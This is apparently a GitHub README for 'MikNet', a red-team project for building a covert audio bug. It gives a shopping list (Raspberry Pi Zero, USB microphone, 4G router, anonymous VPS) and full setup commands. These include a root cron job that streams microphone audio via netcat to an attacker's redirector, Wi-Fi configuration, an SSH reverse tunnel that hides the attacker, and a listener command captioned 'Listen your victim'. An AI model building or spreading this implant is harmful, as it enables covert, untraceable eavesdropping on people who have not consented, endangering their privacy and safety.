# MikNet

<div align="center">
  <br>
  <img src="https://img.shields.io/badge/Python-3.11-informational">
  <br>
  <a href="https://twitter.com/intent/follow?screen_name=ProcessusT" title="Follow"><img src="https://img.shields.io/twitter/follow/ProcessusT?label=ProcessusT&style=social"></a>
  <br>
</div>

 
> Autonomous red team implementation allowing sound capture and broadcast through an untraceable front-end server to the attacker's station
<br><br>
<div align="center">
<img src="https://github.com/ProcessusT/MikNet/raw/main/.assets/demo.jpg" width="80%;">
</div>
<br>

## Presentation
<br>
Video tutorial here : <a href="https://www.youtube.com/watch?v=ItqIIutcaK0">https://www.youtube.com/watch?v=ItqIIutcaK0</a>
<br><br>

## Hardware
<br>

- Wireless 4G router (~17€) : https://www.amazon.fr/dp/B0BRNJ3Z8R <br>
- USB microphone (~8€) : https://www.amazon.fr/dp/B08HY9XTR1 <br>
- Raspberry Pi Zero W (~23€) : https://www.amazon.fr/dp/B06XFZC3BX <br>
- Micro USB to USB cable (female) (~4€) : https://www.amazon.fr/dp/B0CR75SQVX <br>
- Micro USB to USB cable (male) (~7€) : https://www.amazon.fr/dp/B00LN3LQKQ <br>
- External battery 24000mAh (~22€) : https://www.amazon.fr/dp/B09PYK6ZHC <br>
- 16Go SD card (~7€) : https://www.amazon.fr/dp/B0054KHY8C <br>
- Prepaid SIM card with internet data <br>
- Anonymous VPS for redirector <br>
<br >
Total cost : less than 100 €
<br><br>

## Instructions
<br >
- Install raspbian Os on the SD card (https://www.raspberrypi.com/software) <br>
- At first boot, configure your password and enable ssh (not mandatory) <br>
- Create a cronjob by editing the /etc/crontab file and adding this line at the end : <br>
<br >
```bash
* * * * * root pgrep -x arecord >/dev/null && echo "Process found" || arecord -vv | nc YOUR_REDIRECTOR_PUBLIC_IP_ADDRESS 8080
```
<br >
- Configure your wireless 4G router access point configuration by replacing the content of the file /etc/wpa_supplicant/wpa_supplicant.conf :
<br >
```bash
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
country=FR
network={
     ssid="MY_4G_ROUTER"
     psk="SuPeRpAsSwOrD"
     key_mgmt=WPA-PSK
}
```
<br >
- Configure the wifi interface of the raspberry to connect to the 4G router by editing the /etc/network/interfaces file and adding this line at the end :
<br >
```bash
allow-hotplug wlan0
iface wlan0 inet dhcp
    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
```
<br >
- Put the SD card into the Raspberry and power up both the 4G router and Raspberry with attached microphone <br>
- Start the anonymous VPS and allow TCP 8080 port <br>
- Redirect your VPS port to a local port with the command : <br>
<br >
```bash
ssh -NR 8080:127.0.0.1:8080 YOU_VPS_USER@YOU_VPS_PUBLIC_IP_ADDRESS
```
(If the forwarding is not allowed, verify that AllowTcpForwarding and GatewayPorts are set to "yes" in your /etc/ssh/sshd_config and restart the demon)
<br >
- Listen your victim by catching the audio transmitted by netcat :
```bash
nc -nlvp 8080 | aplay -vv
```

<br><br><br>

